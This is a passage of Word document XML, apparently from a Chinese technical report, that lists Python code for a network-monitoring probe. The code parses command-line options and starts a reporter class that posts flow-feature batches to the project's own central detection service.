        <w:t xml:space="preserve">    ap.add_argument("--feature-names", default="models/artifacts/feature_schema.json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F5C4D11">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--pcap", default=None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EDF69BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--csv", default=None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10FA2AFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--dry-run", action="store_true", help="不连中心服务，只抓包与算特征")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="725110F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--count", type=int, default=0, help="抓够 N 个包即退出（自测用）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A90BB8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return ap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7CCBBB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4537ABE8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69AFA645">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def main(argv=None) -&gt; int:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F3B23F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    args = build_parser().parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086201C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if args.token is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2263481D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        args.token = os.environ.get("NETSENTINEL_TOKEN")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B819D71">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not args.dry_run and not args.token:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1458CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise SystemExit("未提供 token：--token 或环境变量 NETSENTINEL_TOKEN（--dry-run 可跳过）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EAD1939">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EB1CE2E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    feature_names = load_feature_names(args.feature_names)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A8E895">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    Probe(args, feature_names).run()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36B3A330">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22DB4D01">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="743F41C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3043DD42">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AF17426">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    sys.exit(main())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3137B413">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BFAFA85">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-7　probe/reporter.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（83 行）　M6 边缘侧上报通道</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BFB3CBC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M6 边缘侧的上报通道：把一批流特征 POST 给中心服务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C2AD61">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60A61095">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>批次格式刻意带上 `feature_names`，让中心端能当场比对训练时的列序。列序一旦错位，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CDCEA6D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>模型不会报错——它只会把"目的端口"当成"流时长"去推理，然后给出一个看起来正常的错误答案。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9BDBCE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>中心端收到列序不符直接拒收，比事后查线上准确率便宜得多。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3788C0FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06079565">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="152CFC12">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="367512BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="543ED905">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E92735A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E83F3C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import httpx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D14D49F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FE6069B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="213FB9A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from settings import is_local_endpoint</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E61978">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>except ImportError:  # 直接 python probe/sniffer.py 时的退路</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16DB06C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    import sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6598C07E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5338E758">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62A2755E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    sys.path.insert(0, str(Path(__file__).resolve().parent.parent))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15512D62">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from settings import is_local_endpoint</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6982A7AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67771FEF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B996BD1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class Reporter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5A9F1E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __init__(self, center_url: str, token: str, probe_id: str, timeout: float = 5.0):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06EF4079">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.url = center_url.rstrip("/") + "/api/v1/report"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8799BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.token = token</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4A6ABD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.probe_id = probe_id</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C19897">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.timeout = timeout</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D9E2A97">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.sent = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E4CDC56">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.failed = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3F5491">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.unreachable = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F819604">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F86C60">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self._client = httpx.Client(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074ACBB2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                timeout=timeout, trust_env=not is_local_endpoint(center_url)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB93CAB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3170B0F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        except ValueError as exc:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1698E35E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise SystemExit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D1CE018">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"HTTP 客户端初始化失败：{exc}\n"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1B6F62">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
